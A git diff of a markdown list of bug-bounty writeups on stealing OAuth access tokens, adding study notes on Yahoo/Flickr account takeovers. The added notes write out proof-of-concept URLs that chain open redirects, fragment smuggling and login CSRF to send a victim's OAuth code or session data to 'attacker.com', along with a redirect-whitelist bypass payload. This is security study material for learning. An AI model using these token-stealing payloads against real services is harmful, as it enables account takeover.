@@ -235,29 +235,8 @@ My intention is to make a full and complete list of common vulnerability that ar
 
 ### Stealing Access Token
 
-- [Stealing Facebook Access Tokens with a Double Submit](https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/) by Jack Whitton
-  - This was an old writeup.
 - [Stealing Facebook access_tokens Using CSRF in Device Login Flow](https://www.josipfranjkovic.com/blog/hacking-facebook-csrf-device-login-flow) by JOSIP FRANJKOVIĆ
-- [Facebook: Bypass OAuth nonce and steal oculus response code](https://medium.com/@lokeshdlk77/bypass-oauth-nonce-and-steal-oculus-response-code-faa9cc8d0d37)
-  - Facebook made a "OAuth login feature" for "Oculus", that meant the user could directly login to "Oculus" using Facebook account, but there was a `nonce` parameter in the URL that the author never seen in any other OAuth flow. So he started to dig deeper on it.
-  - OAuth authorisation URL for "Facebook Oculus":
-    - Request: `https://www.facebook.com/v2.8/dialog/oauth?app_id=1517832211847102&client_id=1517832211847102&domain=auth.oculus.com&locale=en_GB&origin=1&redirect_uri=https://auth.oculus.com/login/&response_type=code&sdk=joey&version=v2.8&nonce=AXRr8eBAjDTBkzQ7&state=d916afa3-3dc1-bab7-fc9d-3c8f44bf757`
-    - Response: `https://auth.oculus.com/login/?code=AQDtxcP7I--AWqEvE-LjcPIjkimy7Z-oQHvLMtGNB8sdKSqhvvv5KFO1KNXgPw4nEewmFsOKsq1GIAcEqJq09rLHlsGQVBxq-HwqbvlE-_unfTayj2HdGp5GGEqsNLlK2zerCpKbBHbiDRW4tr7ZBnxcgebywDbd,lonbrqie5fdwjD-x6jsnI5wnZ4XaDIRMixFoRqtQSne406BwOo2nSVS2o1MmmXkLW_zaW5Vy0SW6&state=d916afa3-3dc1-bab8-fc9d-3c8f44bfe7b7#_=_`
-  - The `nonce` acted as "CSRF token" to prevent the user from CSRF attack, if the `nonce` value is not matched, the OAuth request would get aborted and did not follow the `redirect_uri`. So this OAuth flow had two challenges:
-    - Bypass `nonce`.
-    - Bypass `redirect_uri`.
-  - "CORS Proxy" is a free service for developers who need to bypass same-origin policy related to performing standard "AJAX requests" to 3rd party services (the author listed some online proxy servers).
-  - When the author passed the OAuth URL in the "CORS Proxy" server, it responded the source code of the given URL. When he searched for "nonce" in the source code, he saw that both of the "nonce" value in "real request" and using this "cors request" are same. So he bypassed the `nonce`.
-  - It's time to bypass `redirect_uri`. It made easy then he thought. The below URL redirected the response `code` to his app domain using "referer leakage":
-    - `https://auth.oculus.com/login/?redirect_uri=https://www.facebook.com/dialog/send?client_id=1933886253534366&next=https://www.whatismyreferer.com&from_post=1&error_ok=OK`
-  - Fixed: the leakage of "nonce" value in "CORS Proxy" and the `redirect_uri` in Oculus to Facebok was fixed.
-  - The poc in this writeup is worth to study.
-- [A tale about appengine.google.com authentication and life](https://proximasec.blogspot.com/2017/02/a-tale-about-appengines-authentication.html) by Andrey's Ramblings
-  - `appengine.google.com` used to have a site attached to it, but it's been shutdown in favor of "Google Cloud". Anyway, the only function that this subdomain has is to authenticate users on third party domains. Except for some reason one subdomain on Google itself. To summarize, here are the sites that use this authentication:
-    - Anything on `.withgoogle.com` domain, including the bug hunter dashboard.
-    - `enterprise.google.com`, which is some sort of administration panel for "Gsuite accounts" and even "Google Partners".
-    - `.appspot.com` sites, which are user generated.
-  - I don't understand this writeup.
+  - I think the author used "Facebook Graph API".
 - [Google - Vulnerability in Hangouts Chat: from open redirect to code execution](https://blog.bentkowski.info/2018/07/vulnerability-in-hangouts-chat-aka-how.html) by Michal Bentkowski
   - "Hangout Chat" is an answer to "Slack". It might be used both in browser (at `https://chat.google.com`, requires "GSuite account") and as a desktop or mobile application.
   - The author found an "open redirect" vulnerability in desktop app.
@@ -266,12 +245,50 @@ My intention is to make a full and complete list of common vulnerability that ar
 - [Holy redirect_uri Batman, Google tokens leak](http://blog.intothesymmetry.com/2016/05/holy-redirecturi-batman.html) by Antonio Sanso
   - There were some links between the previous writeup and this one. Complicated.
 
-- [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/) by Jack Whitton
 - [Yahoo Bug Bounty: Exploiting OAuth Misconfiguration To Takeover Flickr Accounts](https://mishresec.wordpress.com/2017/10/12/yahoo-bug-bounty-exploiting-oauth-misconfiguration-to-takeover-flickr-accounts/) by mishre
+  - Some time has passed since the author have tested "Flickr's login flow", so he have decided to take a look and see if something has changed. Surprisingly, he have noticed that Yahoo implemented the classic "OAuth login flow".
+  - When a user wants to login to `flickr.com` he clicks a "sign-in" button which redirects him to:
+    - `https://api.login.yahoo.com/oauth2/request_auth?client_id=dj0yJmk9NTJmMkVmOFo3RUVmJmQ9WVdrOVdXeGhVMWx3TjJFbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD01OA–&redirect_uri=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2Foauth%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252F%253Fytcheck%253D1%2526new_session%253D1&response_type=code&scope=openid%2Csdpp-w&nonce=bb1c92e088f38e9c323fe025d42c405f&.scrumb=jeTYmScEVYq`
+  - If the user is not signed in to Yahoo, he is redirected to the "Yahoo login page" to enter his credentials and then back to the mentioned URL. What happens after arriving to the "OAuth endpoint" is that Yahoo generates a `code` to identify the logged in user, which is sent back to Flickr via another redirect:
+    - `https://www.flickr.com/signin/yahoo/oauth/?redir=https://www.flickr.com/?ytcheck=1&new_session=1&code={redacted}`
+  - What happens now is that in the background Flickr exchanges the `code` supplied by Yahoo for an "access token", and retrieves data about the user using this "access token".
+  - While testing "Yahoo's OAuth implementation", the author came across the page `https://developer.yahoo.com/oauth2/guide/openid_connect/getting_started.html` stating that it's possible to set the `response_type` parameter to contain multiple values. So he decided to check what happens if he set the parameter to have the vaule: `code id_token`. Yahoo were appending both the `code` and the `id_token` to the fragment part of the URL, redirecting him to:
+    - `https://www.flickr.com/signin/yahoo/oauth/?redir=https://www.flickr.com/?ytcheck=1&new_session=1#code={redacted}&id_token={redacted}`
+    - The fragment part of the URL (everything after `#`) is preserved when handling redirect responses from the server. So using this minor issue, we could potentially leak a victim's `code` parameter to anywhere the `redir` parameter points to.
+  - Flickr only performs the redirect if a valid `code` is passed to the server via the query string. So, for an attacker to be able to leak the code, he actually needs to generate a `code` using his own account and then send it as part of the `redirect_uri` URL (how did the author find out this feature?).
+  - Yahoo correctly verified that the URL is of the form: `https://www.flickr.com/*`. This means that we need to find an "open redirect" on `flickr.com` in order to leak the authentication `code` to an attacker's domain. The author was finally able to find such a redirect after downloading the "Flickr android application". He noticed that if the wrong `token` value is passed to a social sharing endpoint (available though the Flickr app and not available via the website), a redirect is performed to the `callback_url` parameter:
+    - `https://www.flickr.com/sharing_connect.gne?service_type_id=9&token=a&callback_url=https%3A%2F%2F%2Fgoogle.com%2F`
+  - Attack flow: an attacker generates a Flickr authentication `code` for his own test account, he then constructs the following URL to send to the victim:
+    - `https://api.login.yahoo.com/oauth2/request_auth?client_id=dj0yJmk9NTJmMkVmOFo3RUVmJmQ9WVdrOVdXeGhVMWx3TjJFbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD01OA–&redirect_uri=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2Foauth%2F%3Fcode%3D{here-is-the-attacker’s-code}%26redir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsharing_connect.gne%253Fservice_type_id%253D9%2526token%253Da%2526callback_url%253Dhttps%25253A%25252F%25252F%25252Fattacker.com%25252F&response_type=code id_token&scope=openid%2Csdpp-w&nonce=bb1c92e088f38e9c323fe025d42c405f&.scrumb=jeTYmScEVYq`
 - [Flickr ATO Fix Bypass](https://ngailong.wordpress.com/2017/08/07/flickr-ato-fix-bypass/) by Ron Chan
+  - The author bypssed the previous vulnerability's fix.
+  - Yahoo restricted the `redirect_uri` directory could only be `/signin/yahoo`.
+    - If you do something like: `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F..%2f..%2f%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fflickrrrrr&.crumb=`, there is no "access token" returned.
+    - The directory is difficult to escaped, no more `../`.
+  - However the payload behind "%3f" seems quite free to mess with, so the author appended a hash behind the URL.
+    - `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fflickrrrrr%23&.crumb=`
+    - The `%23` is decoded the `#` in the response.
+    - `.data` is appended behind the hash.
+    - This means, if he can find any "open redirect" in Flickr, then he can smuggle `.data` to attacker site.
+  - "open redirect" in Flickr is not difficult to find as Yahoo does not accept "open redirect" as valid report.
+    - `https://www.flickr.com/cookie_check.gne?pass=http://www.attacker.com#`
+    - The "302 response" is: `http://www.attacker.com`
+  - So the poc URL:
+    - `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=hk&.done=https%3a%2f%2fwww.flickr.com%2Fsignin%2Fyahoo%2F%3Fredir%3Dhttps%253A%252F%252Fwww.flickr.com%252Fcookie_check.gne%253fpass%253dhttp%253a%252f%252fattacker.com%2523&.crumb=`
 - [One More Thing to Check for SSO – Flickr ATO](https://ngailong.wordpress.com/2017/08/29/one-more-thing-to-check-for-sso-flickr-ato/) by Ron Chan
-- [Yahoo Bug Bounty: Chaining 3 Minor Issues To Takeover Flickr Accounts](https://mishresec.wordpress.com/2017/10/13/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/) by mishre
+  - The author has multiple "Yahoo accounts", at one point, he has "account A session" under `*.yahoo.com`, and has "account B session" under `*.flickr.com`, which is not his intended setup. Then he luckily browse to `https://www.flickr.com/login` base on browsing history in URL bar, and then the website said "You are logging in as ngalongc, are you switching your account to ronchan5?".
+    - This page is interesting is not because its content, it is interesting because the URL of that page actually is storing the `.data` of user temporarily.
+    - After some validation, the author confirm the `.data` could be reused. This is the point we need a "open redirect" and steal the URL by using referer technique.
+  - The `pass` parameter is used for URL redirection, it has some whitelist validation in place to prevent "open redirect", but it coult be bypassed by the payload:
+    - `https://www.flickr.com/cookie_check.gne?pass=https://www.flickr.com%252f@hackerone.com/yahoo`
+  - However, victim needs to have exact same scenario as attacker, which is, they have "account A" autenticated in `*.yahoo.com` and "account B" authenticated in `*.flickr.com`. As this scenario is not that common for normal user, this would drastically decrease the security impact of the bug (always think the attack scenario!).
+  - The author wanted to find a workaround to make it work across all user, so he kept observing the login flow. Finally he notice one simple fact that could turn this bug works universally: Flickr is vulnerable to "login CSRF".
+    - We can first force victim to login "our Flickr account" while keeping "victim's yahoo session" intact, then send the explit payload to victim haver their payload stolen by using the "open redirect".
+  - The poc in this writeup is worth to study.
 - [Stealing $10,000 Yahoo Cookies!](https://blog.witcoat.com/2018/05/30/stealing-10000-yahoo-cookies/) by Bull
+  - The author started to script python, so he decided to write some recon script to filter out domains to attack first out of tens of thousands of Yahoo subdomains which promises some content, since it doesn't seem feasible to visit each one of them.
+  - The script outputted `https://premium.advertising.yahoo.com`. Upon visiting and taking a look at intercepted requests, the page was interacting with "api endpoints" at `https://api.advertising.yahoo.com` using "XmlHttpRequests" and "CROS".
+  - In a requests to `https://api.advertising.yahoo.com/services/network/whoami`, the author saw a lot of headers he sees all day while looking into yahoo in response which kind of freaked him out. It was reflecting all his request header such as `user agent`, `Accept` and `Cookie`.
 - [Login CSRF + Open Redirect = Uber Account Take Over](https://ngailong.wordpress.com/2017/08/07/uber-login-csrf-open-redirect-account-takeover/) by Ron Chan
 - [Uber - redirect_uri is difficult to do it right](https://ngailong.wordpress.com/2017/11/22/uber-redirect_uri-is-difficult-to-do-it-right/) by Ron Chan
 - [Authentication bypass on Airbnb via OAuth tokens theft](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/) by Arne Swinnen
@@ -292,16 +309,7 @@ My intention is to make a full and complete list of common vulnerability that ar
   - So he started looking for CSRF attack, but he didn't get CSRF on the vulnerable page.
   - The author noticed that application was not using the `x-frame` header, so he thought "click jacking".
   - The author changed self-XSS with "click jacking" to grab victim's cookies and gave the poc.
-- [Hacking OAuth2.0 For Fun And Profit](https://drive.google.com/file/d/1Qw3hhValdRAWNGJtLbbFYfKtaevkw4fQ/view) by Pranav Hivarekar
-  - OAuth 2.0 basics:
-    - authorization code grant
-    - implicit grant
-  - Attacks on OAuth 2.0 integrations:
-    - token / code stealing - case study
-    - CSRF (missing `state` param) - case study
-    - token impersonation - case study
-- [Oauth 2.0 redirection bypass cheat sheet](http://nbsriharsha.blogspot.com/2016/04/oauth-20-redirection-bypass-cheat-sheet.html) by nbsriharsha
-  - The author gave a list of payloads used in `redirect_uri` (could try, but I don't think very useful).
+
 - [How I find Open-Redirect Vulnerability in redacted.com (One of the top online payment processing service website)](https://medium.com/@protector47/how-i-find-open-redirect-vulnerability-in-redacted-com-one-of-the-top-payment-gateway-e9b92afdc114) by M.Asim Shahzad
 - [Full Account Takeover via Referer Header (OAuth token Steal, Open Redirect Vulnerability Chaining)](https://medium.com/@protector47/full-account-takeover-via-referrer-header-oauth-token-steal-open-redirect-vulnerability-chaining-324a14a1567) by M.Asim Shahzad
 
